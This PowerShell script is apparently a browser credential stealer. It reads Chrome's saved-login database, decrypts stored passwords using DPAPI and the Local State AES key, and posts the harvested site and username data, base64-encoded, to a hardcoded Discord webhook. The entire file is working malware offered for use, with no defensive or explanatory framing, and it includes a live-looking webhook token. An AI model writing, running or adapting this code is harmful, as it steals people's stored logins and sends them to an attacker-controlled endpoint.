# Set webhook URL
$webhookURL = "https://discord.com/api/webhooks/1059776022331002931/ci73REhGUk4KNSm3RZJmz4qyr02oOzCcqb0xx9K57Z32Q_RJ9ROTC3BGNmIllCgVz38U"

# Set Chrome data path
$chromeDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"

# Add required .NET types
Add-Type -AssemblyName System.Security
Add-Type -TypeDefinition "
using System.Runtime.InteropServices;
using p=System.IntPtr;

$p class W{
    $([DllImport(`"winsqlite3`,EntryPoint=`"sqlite3_open`")]public static extern p O(string f, out p d)");
    $([DllImport(`"winsqlite3`,EntryPoint=`"sqlite3_prepare16_v2`")]public static extern p P(p d, string l, int n, out p s, p t)");
    $([DllImport(`"winsqlite3`,EntryPoint=`"sqlite3_step`")]public static extern p S(p s)");
    $([DllImport(`"winsqlite3`,EntryPoint=`"sqlite3_column_text16`")]public static extern p C(p s, int i)");
    $([DllImport(`"winsqlite3`,EntryPoint=`"sqlite3_column_bytes`")]public static extern int Y(p s, int i)");
    $([DllImport(`"winsqlite3`,EntryPoint=`"sqlite3_column_blob`")]public static extern p L(p s, int i)");
    public static string T(p s, int i){return Marshal.PtrToStringUni(C(s, i));}
    public static byte[] B(p s, int i){
        var r=new byte[Y(s, i)];
        Marshal.Copy(L(s, i), r, 0, Y(s, i));
        return r;
    }
}"

# Open Chrome login data file and prepare statement
$s = [W]::O("$chromeDataPath\Default\Login Data", [ref]$d)
$l = @()

# Decrypt Chrome passwords
if ($host.Version -like "7*") {
$b = (Get-Content "$chromeDataPath\Local State" | ConvertFrom-Json).os_crypt.encrypted_key
$x = [Security.Cryptography.AesGcm]::New([Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($b)[5..($b.Length - 1)], $null, 0))
}
[W]::P($d, "SELECT * FROM logins WHERE blacklisted_by_user=0", -1, [ref]$s, 0)

for(; ([W]::S($s) % 100) -ne 1;) {
$l += [W]::T($s, 0), [W]::T($s, 3)
$c = [W]::B($s, 5)
try {
$e = [Security.Cryptography.ProtectedData]::Unprotect($c, $null, 0)
} catch {
if ($x) {
try {
$e = $x.Decrypt($c, [Text.Encoding]::Unicode.GetBytes(""), $null)
} catch { }
}
}
}

#Create object with username and password
$data = @{
username = $l[0]
password = [Text.Encoding]::Unicode.GetString($e)
}

# Send decrypted passwords to webhook
$r = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(($l) -join ','))
Invoke-WebRequest -Method Post -Uri $webhookURL -Body $r

#Send data to webhook
#Invoke-WebRequest -Method Post -Uri $webhookURL -Body ($data | ConvertTo-Json)
